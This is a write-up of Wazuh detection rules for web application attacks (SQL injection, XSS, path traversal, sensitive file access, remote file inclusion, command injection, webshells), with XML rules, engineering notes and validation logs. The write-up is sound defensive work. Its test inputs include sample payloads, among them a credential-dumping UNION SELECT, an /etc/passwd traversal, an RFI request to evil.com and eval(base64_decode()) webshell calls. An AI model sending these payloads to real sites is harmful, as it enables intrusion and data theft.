# Phase 3 — Detection Rules: Web Application Attacks

Rules: 200300–200306
Author: Mohamed Amine Namouchi
Date: June–July 2026
Status: ✅ Complete — all validated

---

## Overview

This rule family covers the classic OWASP web application attack categories
targeting the 50+ hosted sites. Unlike the WordPress family which targets
specific CMS endpoints, these rules detect attack patterns in the URL itself —
SQL injection payloads, XSS strings, path traversal sequences, sensitive file
access, remote file inclusion, command injection, and webshell execution
patterns.

All rules depend on the `apache-vhost-full` decoder and match against the
`full_log` field (the raw log line) using `<match type="pcre2">` — since
`url` is a reserved Wazuh field that cannot be used in `<field>` directives.

**Key observation from production:** real attack traffic uses URL encoding
(`%27` for `'`, `%20` for space, `%2f` for `/`). All patterns below cover
both raw and URL-encoded variants where applicable.

---

## Rule 200300 — SQL Injection Attempt

**Trigger:** SQL injection patterns in the URL (UNION SELECT, 1=1, %27, sleep(), benchmark())

**Level:** 10 — active exploitation attempt.

```xml
<rule id="200300" level="10">
  <decoded_as>apache-vhost-full</decoded_as>
  <match type="pcre2">(?i)(union(\s|%20)+select|1=1|%27|\bor\b.{1,10}=|sleep\(|benchmark\()</match>
  <description>Web Hosting: SQL injection attempt from $(srcip) on $(vhost)</description>
  <group>web_attack,sql_injection,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5.1,</group>
  <mitre>
    <id>T1190</id>
  </mitre>
</rule>
```

**Engineering note:** raw apostrophe (`'`) breaks the decoder since Apache
log lines wrap the request in quotes. Real SQLi traffic uses `%27` (URL-encoded
apostrophe) which is safe to match. The pattern `1=1` catches boolean-based
blind injection; `sleep\(` and `benchmark\(` catch time-based blind injection.

**Validated:** wazuh-logtest with URL-encoded UNION SELECT:
```
GET /product?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--
→ Rule 200300 level 10, T1190
```

Note: raw apostrophe in the URL (`GET /product?id=1' UNION SELECT`) breaks
the Apache log line format (unmatched quotes) and causes "No decoder matched"
in wazuh-logtest. This is expected — real attack tools always URL-encode.

---

## Rule 200301 — XSS Attempt

**Trigger:** XSS patterns in the URL (`<script`, `onerror=`, `javascript:`)

**Level:** 8 — reflected XSS attempt.

```xml
<rule id="200301" level="8">
  <decoded_as>apache-vhost-full</decoded_as>
  <match type="pcre2">(?i)(%3Cscript|&lt;script|onerror(\s|%20)*=|javascript:|%3Conerror)</match>
  <description>Web Hosting: XSS attempt from $(srcip) on $(vhost)</description>
  <group>web_attack,xss,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5.1,</group>
  <mitre>
    <id>T1190</id>
  </mitre>
</rule>
```

**Engineering note — XML escaping required:** the pattern initially contained
`<script` which caused an XML parsing error (`Element 'script' not closed`)
breaking the entire rules file. The `<` character must be escaped as `&lt;`
in XML rule files. This is a common pitfall when writing web attack signatures
in Wazuh XML rules.

**Validated:** wazuh-logtest with `%3Cscript%3Ealert(1)%3C/script%3E` in URL.

---

## Rule 200302 — Path Traversal Attempt

**Trigger:** directory traversal sequences in the URL (`../`, `%2e%2e`, `..\`)

**Level:** 10 — active file system traversal attempt.

```xml
<rule id="200302" level="10">
  <decoded_as>apache-vhost-full</decoded_as>
  <match type="pcre2">(\.\./|%2e%2e|\.\.%2f|%2e%2e%2f)</match>
  <description>Web Hosting: Path traversal attempt from $(srcip) on $(vhost)</description>
  <group>web_attack,path_traversal,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5.1,</group>
  <mitre>
    <id>T1190</id>
  </mitre>
</rule>
```

**Validated:** wazuh-logtest with `GET /download?file=..%2f..%2f..%2fetc%2fpasswd`.

---

## Rule 200303 — Sensitive File Access

**Trigger:** requests targeting sensitive files (`.env`, `wp-config.php`,
`.git/`, `/etc/passwd`, `.htpasswd`, `id_rsa`)

**Level:** 10 — information disclosure attempt.

```xml
<rule id="200303" level="10">
  <decoded_as>apache-vhost-full</decoded_as>
  <match type="pcre2">(?i)(\.env|wp-config\.php|\.git/|/etc/passwd|\.htpasswd|id_rsa)</match>
  <description>Web Hosting: Sensitive file access attempt from $(srcip) on $(vhost)</description>
  <group>web_attack,sensitive_file,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5.1,</group>
  <mitre>
    <id>T1083</id>
  </mitre>
</rule>
```

**Validated in production:** rule 200303 fired organically on
`<attacker-ip>` targeting `<client-domain>` with:
```
GET /wp-content/plugins/count-per-day/download.php?n=1&f=/etc/passwd
GET /wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd
```
Real plugin LFI exploitation attempts detected within hours of deployment.

---

## Rule 200304 — Remote File Inclusion

**Trigger:** external URL (`http://` or `https://`) in a URL parameter

**Level:** 12 — critical, email notification enabled (`mail: True`).

```xml
<rule id="200304" level="12">
  <decoded_as>apache-vhost-full</decoded_as>
  <match type="pcre2">(?i)[?&amp;]\w+=(https?(:|%3a)(\/\/|%2f%2f))</match>
  <description>Web Hosting: Remote File Inclusion attempt from $(srcip) on $(vhost)</description>
  <group>web_attack,rfi,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5.1,</group>
  <mitre>
    <id>T1190</id>
  </mitre>
</rule>
```

**Engineering note — XML entity escaping:** the `&` character in the regex
`[?&\w+]` must be written as `&amp;` in XML. Failure to escape causes a
parsing error breaking the entire rules file.

**False positive note:** WordPress's `redirect_to=https://` parameter
in `wp-login.php` can trigger this rule (`wp-login.php?redirect_to=https%3A%2F%2F...`).
This is a known false positive that should be filtered or accepted as
an acceptable noise level given the rule's criticality.

**Validated:** wazuh-logtest with `GET /page?file=http://evil.com/shell.txt`.

---

## Rule 200305 — Command Injection

**Trigger:** command injection patterns in URL parameters
(`cmd=`, `exec=`, `system()`, shell commands after `;`)

**Level:** 12 — critical, email notification enabled.

```xml
<rule id="200305" level="12">
  <decoded_as>apache-vhost-full</decoded_as>
  <match type="pcre2">(?i)[?&amp;]\w+=.*(cmd=|exec=|system\(|passthru\(|shell_exec\(|;\s*(cat|ls|whoami|wget|curl)\s)</match>
  <description>Web Hosting: Command injection attempt from $(srcip) on $(vhost)</description>
  <group>web_attack,command_injection,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5.1,</group>
  <mitre>
    <id>T1059</id>
  </mitre>
</rule>
```

**Validated:** wazuh-logtest with `GET /tool?cmd=system(whoami)`.

---

## Rule 200306 — Webshell Access

**Trigger:** webshell execution function calls in URL
(`eval(`, `base64_decode(`, `shell_exec(`, `assert(`)

**Level:** 14 — highest severity in the ruleset, email notification enabled.

```xml
<rule id="200306" level="14">
  <decoded_as>apache-vhost-full</decoded_as>
  <match type="pcre2">(?i)(eval\(|base64_decode\(|shell_exec\(|assert\(|preg_replace\(.*\/e)</match>
  <description>Web Hosting: Webshell access attempt from $(srcip) on $(vhost)</description>
  <group>web_attack,webshell,gdpr_IV_35.7.d,nist_800_53_SI.4,pci_dss_6.5.1,</group>
  <mitre>
    <id>T1505.003</id>
  </mitre>
</rule>
```

**Validated:** wazuh-logtest with
`GET /shell.php?c=eval(base64_decode($_POST[x]))` — rule 200306 fires
at level 14 with MITRE T1505.003 (Web Shell), `mail: True`.

---

## Key Engineering Challenges

### XML special characters in PCRE2 patterns

Three characters require XML escaping when used inside rule `<match>` or
`<field>` patterns:

| Character | XML escape | Context |
|---|---|---|
| `<` | `&lt;` | XSS patterns (`<script`) |
| `>` | `&gt;` | Rarely needed in web patterns |
| `&` | `&amp;` | RFI/CMDi patterns (`[?&\w+]`) |

Failure to escape these causes the XML parser to break the entire rules
file — `wazuh-analysisd -t` catches these before deployment.

### `url` is a reserved Wazuh field

`<field name="url">` fails silently — the rule compiles but never matches.
All URL-based patterns must use `<match type="pcre2">` on the full log line
instead. This works because the URL is always present in the Apache log line
between the HTTP method and the protocol version.

### URL encoding coverage

Real attack tools (sqlmap, nikto, burpsuite) URL-encode payloads before
sending. Patterns must cover both raw and encoded variants:
- `<script` AND `%3Cscript`
- `../` AND `%2e%2e%2f`
- `http://` AND `https%3A%2F%2F`

---

## Validation Summary

| Rule | Trigger | Level | MITRE | Validated |
|---|---|---|---|---|
| 200300 | SQL injection patterns | 10 | T1190 | ✅ wazuh-logtest |
| 200301 | XSS patterns | 8 | T1190 | ✅ wazuh-logtest |
| 200302 | Path traversal | 10 | T1190 | ✅ wazuh-logtest |
| 200303 | Sensitive file access | 10 | T1083 | ✅ Production (LFI attempts) |
| 200304 | Remote File Inclusion | 12 | T1190 | ✅ wazuh-logtest |
| 200305 | Command injection | 12 | T1059 | ✅ wazuh-logtest |
| 200306 | Webshell access | 14 | T1505.003 | ✅ wazuh-logtest |

---

*Part of Phase 3 — Detection Rules*
*Last updated: August 2026*
